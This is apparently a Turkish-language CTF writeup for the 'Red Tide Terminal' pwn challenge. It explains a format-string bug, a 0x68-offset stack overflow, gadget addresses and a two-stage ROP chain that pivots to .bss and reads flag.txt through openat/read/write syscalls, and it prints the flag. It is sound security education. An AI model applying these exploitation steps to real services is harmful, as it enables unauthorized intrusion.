# Junior Crypt 2026 CTF — `Red Tide Terminal` Writeup

- **Yazar:** Efe Sahinbas
- **GitHub Deposu:** [MacallanTheRoot/ctf-writeups](https://github.com/MacallanTheRoot/ctf-writeups/)

**Kategori:** Pwn  
**Hedef:** `red_tide_terminal`  
**Remote:** `10.112.0.12:48804`  
**Flag formatı:** `grodno{...}`

---

## Soru İçeriği

```text
An abandoned coastal command terminal has reappeared on a live network map after years of silence.
Now it responds again, but only briefly, and every connection ends with the same cold message about awaiting authorized personnel.
Reach the terminal core and recover the flag.
```

---

## Özet

Binary, NX, Full RELRO, PIE ve stack canary korumalarına sahip 64-bit Linux ELF dosyasıydı. Yerel dosya PIE olarak görünse de remote servis sabit adresli, PIE kapalı bir layout ile çalışıyordu.

Program önce codename istiyor ve bu değeri `printf(codename)` ile yazdırıyordu. Bu bir format-string açığı veriyordu. Sonrasında packet length alınıp küçük bir stack buffer'a fazla veri okunuyordu. Remote build'de return adresi kontrolü `0x68` offsetinde sağlandı.

Final exploit iki aşamalı ROP zinciri kullandı:

1. İlk stack overflow ile `read(0, path_buf, 0x300)` çağırıldı.
2. `leave; ret` ile stack `.bss` alanına pivot edildi.
3. İkinci aşamada `openat`, `read`, `write` syscalls ile ORW zinciri çalıştırıldı.
4. `flag.txt` açılıp flag ekrana yazdırıldı.

Final flag:

```text
grodno{2e66eeda-bc51-406d-8373-422b3462fed9}
```

---

## 1. İlk Binary İncelemesi

Başta klasik kontroller yapıldı:

```bash
file red_tide_terminal
checksec --file=red_tide_terminal
```

Görülen korumalar:

```text
Full RELRO
Stack Canary
NX enabled
PIE enabled locally
```

Binary stripped değildi ve faydalı semboller vardı:

```text
pop_rdi_ret  0x13b0
pop_rsi_ret  0x13b5
pop_rdx_ret  0x13ba
pop_rax_ret  0x13bf
syscall_ret  0x13c4
leave_ret    0x13ae
path_buf     0x4060
io_buf       0x4080
```

---

## 2. Program Davranışı

Servis bir banner yazdırıp codename istiyordu:

```text
== Red Tide Terminal ==
Codename:
```

Codename daha sonra şu şekilde yazdırılıyordu:

```c
printf(codename);
```

Bu satır format-string açığı oluşturuyordu. Ardından packet handler'a geçiliyordu:

```text
Packet length:
Packet data:
```

Packet handler `0xf0` değerine kadar uzunluk kabul ediyordu, fakat stack buffer bundan daha küçüktü. Bu yüzden asıl kontrol akışı packet input üzerinden ele geçirildi.

---

## 3. Remote Layout Farkı

Yerel binary PIE idi, ancak remote leak'lerde şu tarz sabit adresler görünüyordu:

```text
0x40159a
0x401579
```

Bu remote binary'nin `0x400000` base adresiyle çalıştığını gösterdi. Exploit bu yüzden absolute remote adresleri kullandı:

```text
pop rdi; ret  0x4013b0
pop rsi; ret  0x4013b5
pop rdx; ret  0x4013ba
pop rax; ret  0x4013bf
syscall; ret  0x4013c4
pop rbp; ret  0x4011a4
leave; ret    0x4013ae
path_buf      0x404060
io_buf        0x404080
```

---

## 4. Kontrolün Bulunması

Remote return adresi offseti şu şekilde doğrulandı:

```text
0x68
```

Route handler içine geri dönüş yapan küçük test payload'u tekrar `Packet length:` prompt'u verdi. Bu, RIP kontrolünün alındığını gösterdi.

Payload yapısı:

```text
"A" * 0x68
ROP chain
```

Packet length limiti, küçük bir ilk aşama ROP zinciri için yeterliydi.

---

## 5. Birinci Aşama: Read ve Pivot

İlk aşama gerçek ROP zincirini `.bss` alanına okuyup stack'i oraya taşıdı:

```text
read(0, path_buf, 0x300)
rbp = path_buf
leave; ret
```

Bu yöntem küçük packet-size limitini aşmayı sağladı. İlk packet yalnızca stack pivot hazırlığını içeriyordu.

---

## 6. İkinci Aşama: ORW Zinciri

İkinci aşama doğrudan `.bss` üzerinden çalıştı:

```text
openat(AT_FDCWD, "flag.txt", 0)
read(3, io_buf, 0x100)
write(1, io_buf, 0x100)
exit(0)
```

Seccomp filtresi sınırlı olduğu için libc fonksiyonları yerine raw syscall zinciri kullanıldı.

İzin verilen syscall'lar yeterliydi:

```text
read
write
openat
exit
exit_group
```

---

## 7. Flag'in Alınması

İlk aşama overflow ve ardından `.bss` üzerindeki ikinci aşama ROP payload'u gönderildiğinde servis şu çıktıyı verdi:

```text
grodno{2e66eeda-bc51-406d-8373-422b3462fed9}
```

---

## 8. Sonuç

Challenge, yanıltıcı bir format-string açığı ile daha kullanışlı bir stack overflow'u birleştiriyordu. Çözüm adımları:

```text
1. Packet overflow'u tespit et.
2. Remote binary'nin sabit adres kullandığını fark et.
3. Packet length limitine sığacak küçük bir read-and-pivot zinciri kur.
4. Tam ORW zincirini .bss alanına taşı.
5. İzin verilen syscall'larla flag.txt dosyasını oku ve yazdır.
```
